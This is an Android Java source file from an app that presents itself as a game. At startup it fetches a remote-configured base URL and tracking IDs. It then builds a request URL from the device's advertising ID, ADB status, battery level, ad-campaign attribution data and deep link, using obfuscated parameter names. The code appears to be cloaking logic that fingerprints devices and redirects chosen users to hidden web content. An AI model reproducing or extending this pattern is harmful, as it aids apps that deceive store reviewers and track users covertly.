package com.pikpok.hrc.startEgypt;

import static com.pikpok.hrc.Application.fFd;
import static com.pikpok.hrc.Application.userDao;

import android.annotation.SuppressLint;
import android.util.Log;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.pikpok.hrc.data.dfd.EntityDataMob;
import com.pikpok.hrc.data.grgr.EntityDepp;
import com.pikpok.hrc.data.grgr.EntityEgypt;
import com.pikpok.hrc.startEgypt.rfrfr.AppsEgypt;
import com.pikpok.hrc.startEgypt.rfrfr.FbEgypt;
import com.pikpok.hrc.ui.SplashActivity;

import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.observers.DisposableSingleObserver;
import io.reactivex.schedulers.Schedulers;

public class StartEgypt {
    SplashActivity splashActivity;
    public String aaappId;
    public String ffffId;
    public String ffffftok;
    String s1;
    String s2;
    String s3;
    public static boolean start = false;
    public static String ccc;
    public static String star;

    public StartEgypt(SplashActivity splashActivity) {
        this.splashActivity = splashActivity;

    }

    public void start(StartInterfaseEgypt startInterfaseEgypt) {
        build(startInterfaseEgypt);
        userDao.getEgypt().subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new DisposableSingleObserver<EntityEgypt>() {
                    @SuppressLint("CheckResult")
                    @Override
                    public void onSuccess(EntityEgypt entityEgypt) {

                        star = entityEgypt.egypt;
                        startInterfaseEgypt.startEgypt(true);

                    }

                    @Override
                    public void onError(Throwable e) {

                        start = true;
                        FirebaseRemoteConfig mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
                        mFirebaseRemoteConfig.fetchAndActivate()
                                .addOnCompleteListener(splashActivity, task -> {
                                    if (task.isSuccessful()) {
                                        aaappId = mFirebaseRemoteConfig.getString("aappId");
                                        ffffId = mFirebaseRemoteConfig.getString("fffId");
                                        ffffftok = mFirebaseRemoteConfig.getString("fffTok");

                                        new FbEgypt(splashActivity, StartEgypt.this).getFb();
                                        new AppsEgypt(splashActivity, StartEgypt.this).init();

                                    } else {
                                        splashActivity.dialog();
                                    }

                                });
                    }
                });
    }

    @SuppressLint("CheckResult")
    private void build(StartInterfaseEgypt startInterfaseEgypt) {

        userDao.getApps().observeOn(AndroidSchedulers.mainThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(entityApps -> {
                    if (start) {
                        if (entityApps.size() > 0) {
                            Log.e("weq", entityApps.get(0).getAf_status());
                            s1 = "&fffdawqqqqqqa=" + entityApps.get(0).getCampaign() +
                                    "&medes=" + entityApps.get(0).getMedia_source() +
                                    "&vvvvvas=" + entityApps.get(0).getAf_channel() +
                                    "&kkfkdeqxvbn=" + entityApps.get(0).getAf_status() +
                                    "&nnbfvnnf=" + entityApps.get(0).getAf_ad() +
                                    "&qqadcccxzmmjg=" + entityApps.get(0).getCampaign_id() +
                                    "&jjhggtyytg=" + entityApps.get(0).getAdset_id() +
                                    "&nnnmbbvmdbbv=" + entityApps.get(0).getAd_id() +
                                    "&nnnnbvfffttrqqwekloutf=" + entityApps.get(0).getAdset();
                            ccc = entityApps.get(0).getCampaign();
                            Log.e("weq", s1);
                            build2(startInterfaseEgypt);
                        }

                    }
                });

    }

    private void build2(StartInterfaseEgypt startInterfaseEgypt) {

        userDao.getDataMob().subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread())
                .observeOn(AndroidSchedulers.mainThread()).subscribe(new DisposableSingleObserver<EntityDataMob>() {
                    @Override
                    public void onSuccess(EntityDataMob entityDataMob) {
                        s2 = "?qwertygfds=" + entityDataMob.getGaid()
                                + "&kfjdjdiiiioooeeee=" + entityDataMob.getAppId() +
                                "&hgfffffdgfd=" + entityDataMob.getAdb() +
                                "&lfhdhhsusuw=" + entityDataMob.getBat();
                        build3(startInterfaseEgypt);
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("weq", e.getMessage());
                    }
                });
    }

    private void build3(StartInterfaseEgypt startInterfaseEgypt) {
        userDao.getDeep().subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new DisposableSingleObserver<EntityDepp>() {
                    @Override
                    public void onSuccess(EntityDepp entityDepp) {
                        s3 = "&ddddddddddrrrrrrrrreeeeeee=" + entityDepp.getDeep();
                        kg(startInterfaseEgypt);
                    }

                    @Override
                    public void onError(Throwable e) {
                        Log.e("saa", e.getMessage());
                    }
                });
    }

    private void kg(StartInterfaseEgypt startInterfaseEgypt) {
        String dd = fFd.getDd() + s2 + s1 + s3;
        new GoEgypt(startInterfaseEgypt, splashActivity).go(dd);
    }
}